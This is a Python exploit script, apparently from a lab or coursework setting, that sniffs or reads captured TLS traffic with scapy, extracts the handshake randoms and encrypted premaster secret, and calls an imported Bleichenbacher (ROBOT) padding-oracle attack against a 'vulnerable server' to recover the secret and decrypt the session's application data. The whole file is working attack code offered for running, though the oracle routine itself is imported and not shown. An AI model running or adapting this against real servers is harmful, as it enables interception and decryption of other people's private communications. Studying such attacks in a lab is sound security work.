from scapy.all import *
import struct
import binascii 
import sys
from robot_attack import perform_decrypt_attack
import argparse
from decrypt_aes import Decrypt
load_layer("tls")

client_random = None
server_random = None
enc_premaster_secret = None
decrypt = None

parser = argparse.ArgumentParser(description="Bleichenbacher attack")
parser.add_argument("pcap", nargs="?", default="", help="Pcap file to read from")
parser.add_argument("-p", "--port", metavar='int', default=4000, help="TCP port")
parser.add_argument("-host", "--host", default='127.0.0.1', help="Host ip address of vulnereable server")
# parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
# groupcipher = parser.add_mutually_exclusive_group()
# groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
# groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
args = parser.parse_args()

args.port = int(args.port)

def to_hex(bytes):
  return binascii.hexlify(bytearray(bytes))

def process_packet(packet):
  global client_random, server_random
  global enc_premaster_secret, decrypt
  if (Raw in packet):
    raw = bytes(packet[Raw])

    if(int(raw[0]) == 22):
      handshake_type = int(raw[5])
      if (handshake_type == 1):
        print("Found ClientHello")
        client_random = int.from_bytes(raw[11:43], "big")
        print("client random: ", hex(client_random))
      elif (handshake_type == 2):
        print("Found ServerHello")
        server_random = int.from_bytes(raw[11:43], "big")
        print("server random: ", hex(server_random))
      elif (handshake_type == 16):
        print("Found Client key exchange")
        length = int.from_bytes(raw[9:11], "big")
        enc_premaster_secret = raw[11:11+length]
        print("Encrypted premaster secret: " + str(to_hex(enc_premaster_secret)))

        dec_premaster_secret_data = perform_decrypt_attack(args.host, args.port, enc_premaster_secret, 5, False)
        dec_premaster_secret = int.to_bytes(dec_premaster_secret_data, sys.getsizeof(dec_premaster_secret_data), "big")
        dec_premaster_secret = int.from_bytes(dec_premaster_secret, "big")
        print("Decrypted premaster secret: ", hex(dec_premaster_secret))
        decrypt = Decrypt(hex(dec_premaster_secret), hex(client_random), hex(server_random))
    if(int(raw[0]) == 23): # application data
        print("Found application data")
        data_length = int.from_bytes(raw[3:5], "big")
        data = int.from_bytes(raw[5:5+data_length], "big")
        print("Encrypted application data: " + hex(data))
        if(packet[TCP].sport == 4000):
          data = decrypt.decrypt_app_data("server", raw[5:5+data_length])
        else:
          data = decrypt.decrypt_app_data("client", raw[5:5+data_length])
        print("Decrypted data:\n", data)

if (args.pcap != ""):
  packets = rdpcap(args.pcap)
  for packet in packets:
    process_packet(packet)
else:
  sniff(filter="tcp", prn=process_packet, iface="eth0", store=True)

